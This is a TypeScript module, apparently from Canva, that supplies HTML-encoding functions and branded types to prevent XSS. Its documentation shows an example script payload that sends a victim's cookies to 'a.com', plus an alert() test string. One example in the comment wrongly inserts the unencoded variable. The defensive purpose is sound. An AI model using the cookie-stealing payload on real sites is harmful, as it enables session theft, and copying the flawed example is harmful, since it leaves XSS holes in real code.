/* tslint:disable */
//TODO: remove above line and fill in documentation for these functions.
/**
 * Functions and types for HTML encoded strings
 *
 * Different contexts require different encoding rules, e.g. `&` is valid in a
 * `<script>` tag, but not in normal HTML content. There's no set of rules that
 * works in all contexts, so this module provides functions and types for two:
 *
 * - content, e.g. `<div>(value)</div>`, and
 * - quoted attribute values, e.g. `<div data-attr="(value)">`.
 *
 * Some contexts this module does not support are:
 *
 * - attribute names, e.g. `<div (value)>`,
 * - JavaScript, e.g. `<script>(value)</script>`, and
 * - unquoted attribute values, e.g. `<div data-attr=(value)>`.
 *
 * This module will most frequently be used with i18n ICU messages containing
 * HTML. In fact, messages that return HTML must only accept parameters of types
 * `HtmlEncodedContent`, `HtmlEncodedAttributeValue`, or number.
 *
 * React contextually encodes all content except that which is provided via the
 * `__dangerouslySetInnerHtml` attribute. That's where this module is necessary.
 *
 * An XSS vulnerability is present when any content under users' control is
 * placed in an HTML document without being properly encoded. For example:
 *
 * 1. User A creates a design with title `<script>new Image().src = 'http://a.com?c=' + document.cookie</script>`
 * 2. User B loads A's document in their browser
 * 3. The design's title (along with the script tag within) is rendered
 *    un-encoded in B's browser
 * 4. The script executes and sends B's cookies to A, letting A impersonate B
 *
 * To prevent XSS vulnerabilities you must ensure all dynamic values placed in
 * the HTML document are encoded. This includes values entered by the user, and
 * values returned from external sources such as the server.
 *
 * In general it's best to encode all strings placed in the document unless
 * you're certain they contain safe HTML that should be rendered.
 *
 * Examples of when to use HTML encoding:
 *
 * - I18n messages that contain HTML, e.g.
 *
 *     // Definition
 *     myMessage: (className: HtmlEncodedAttributeValue, username: HtmlEncodedContent) =>
 *         'Designed by <span class={0}>{1}</span>' as SafeHtml,
 *
 *     // Usage
 *     MyMessages.myMessage(styles.myClass, encodeAsHtmlContent(username));
 *
 * - When using the `__dangerouslySetInnerHtml` attribute (not recommended), e.g.
 *
 *     const encodedDocTypeName = encodeAsHtmlContent(docTypeName);
 *     <div __dangerouslySetInnerHtml={ `Create a ${docTypeName}` }/>
 *
 * - When generating snippets of HTML to be displayed to the user, e.g.
 *
 *     const encodedDocId = encodeAsHtmlAttributeValue(documentContext.id);
 *     const embedCodeHtml = `<div data-design-id="${encodedDocId}" />`;
 *     return <div>Copy embed code: <input value={embedCodeHtml} /> </div>;
 *
 *   There are two potential XSS vulnerabilities here: one in Canva, and one in the user's site.
 *   React will encode `embedCodeHtml` and protect Canva, but it will be displayed un-encoded in
 *   the browser from which it may be copied. We must encode `documentContext.id` to also protect
 *   the user's site.
 *
 * Examples of when not to use HTML encoding:
 *
 * - React attributes and content (as they would be double encoded), e.g.
 *
 *     const MyComponent = ({ className, username }: { className: HtmlEncodedAttributeValue, username: HtmlEncodedContent }) =>
 *         <div>Designed by <span class={className}>{username}</span></div>;
 *
 * - When you're sure the string contains safe HTML that you want rendered, e.g.
 *
 *     // Safe because `HTML_CONTENT` contains no variables
 *     const HTML_CONTENT = `Click <a href="canva.support.com">here</a> for support.`
 *     <div __dangerouslySetInnerHtml={ HTML_CONTENT } />
 *
 * For more details on XSS vulnerabilities and their prevention see
 * https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
 */

/**
 * HTML that is safe to be rendered
 *
 * This means that dynamic values have been escaped using the functions below.
 *
 * Keep this type's name in sync with
 * `tools/tslint/tslint-rules/src/htmlMessageParameterTypesRule.ts` and
 * `tools/webpack/messages-loader/src/transform.js`.
 */
export type SafeHtml = string & { __safeHtml: never };

/**
 * HTML encoded content
 *
 * Example usage:
 *
 *     const MyMessages = {
 *         myMessage: (content: HTMLEncodedContent) => '<div>{0}</div>',
 *     };
 *
 *     MyMessages.myMessage(encodeAsHtmlContent('<script>alert(0)</script>'));
 */
export type HtmlEncodedContent = string & { __htmlEncodedContent: never };
const contentEncodings: { [key: string]: string } = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '/': '&#x2F;',
};
const contentRegex = new RegExp(`[${Object.keys(contentEncodings).join('')}]`, 'g');

export function encodeAsHtmlContent(str: string): HtmlEncodedContent {
  return str.replace(contentRegex, char => contentEncodings[char]) as HtmlEncodedContent;
}

/**
 * HTML encoded attribute value
 *
 * Note that the value must be quoted.
 *
 * Example usage:
 *
 *     const MyMessages = {
 *         myMessage: (className: HtmlEncodedAttributeValue) => '<div class="{0}">Hello</div>',
 *     };
 *
 *     MyMessages.myMessage(encodeAsHtmlAttributeValue(styles.myClass));
 */
export type HtmlEncodedAttributeValue = string & { __htmlEncodedAttribute: never };
const attributeEncodings: { [key: string]: string } = {
  ...contentEncodings,
  '"': '&quot;',
  '\'': '&#x27;',
};
const attributeRegex = new RegExp(`[${Object.keys(attributeEncodings).join('')}]`, 'g');

export function encodeAsHtmlAttributeValue(str: string): HtmlEncodedAttributeValue {
  return str.replace(attributeRegex, char => attributeEncodings[char]) as HtmlEncodedAttributeValue;
}
